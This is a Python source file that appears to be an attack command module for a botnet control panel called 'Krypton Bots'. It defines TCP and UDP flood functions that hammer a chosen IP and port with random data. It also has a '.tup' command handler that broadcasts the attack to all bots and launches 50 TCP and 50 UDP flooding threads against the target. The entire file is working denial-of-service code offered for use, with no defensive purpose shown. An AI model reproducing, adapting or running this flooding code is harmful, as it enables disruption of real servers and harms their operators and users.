from colorama import Fore
import threading
import socket
import random
import time

def send_tcp_packet(ip, port, size, duration):
    end_time = time.time() + int(duration)
    packet_data = random._urandom(int(size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while time.time() < end_time:
        try:
            sock.connect((ip, int(port)))
            sock.sendall(packet_data)
        except Exception as e:
            print(f"Error sending TCP packet: {e}")
        finally:
            sock.close()

def send_udp_packet(ip, port, size, duration):
    end_time = time.time() + int(duration)
    packet_data = random._urandom(int(size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while time.time() < end_time:
        try:
            if port == 0:  # Random port mode
                port = random.randint(1, 65535)
            sock.sendto(packet_data, (ip, int(port)))
        except Exception as e:
            print(f"Error sending UDP packet: {e}")
    sock.close()

def tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = int(args[2])
        secs = args[3]
        size = args[4]

        info_message = '''%s============= (%sTARGET%s) ==============
            %s  IP:%s %s
            %sPORT:%s %s
            %sTIME:%s %s
            %sSIZE:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, ip, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, size, Fore.CYAN, Fore.LIGHTWHITE_EX, 'TCP and UDP Flood')

        if validate_ip(ip):
            if validate_port(port, True):
                if validate_time(secs):
                    if validate_size(size):
                        for x in info_message.split('\n'):
                            send(client, '\x1b[3;31;40m' + x)
                        send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                        broadcast(data)

                        # Launch multiple threads for TCP and UDP attacks
                        thread_count = 50
                        for _ in range(thread_count):
                            # TCP threads
                            tcp_thread = threading.Thread(target=send_tcp_packet, args=(ip, port, size, secs))
                            tcp_thread.start()
                            # UDP threads
                            udp_thread = threading.Thread(target=send_udp_packet, args=(ip, port, size, secs))
                            udp_thread.start()

                    else:
                        send(client, Fore.RED + '\nInvalid packet size (1-65500 bytes)\n')
                else:
                    send(client, Fore.RED + '\nInvalid attack duration (10-1200 seconds)\n')
            else:
                send(client, Fore.RED + '\nInvalid port number (1-65535)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.tup [IP] [PORT] [TIME] [SIZE]')
        send(client, 'Use port 0 for random port mode\n')

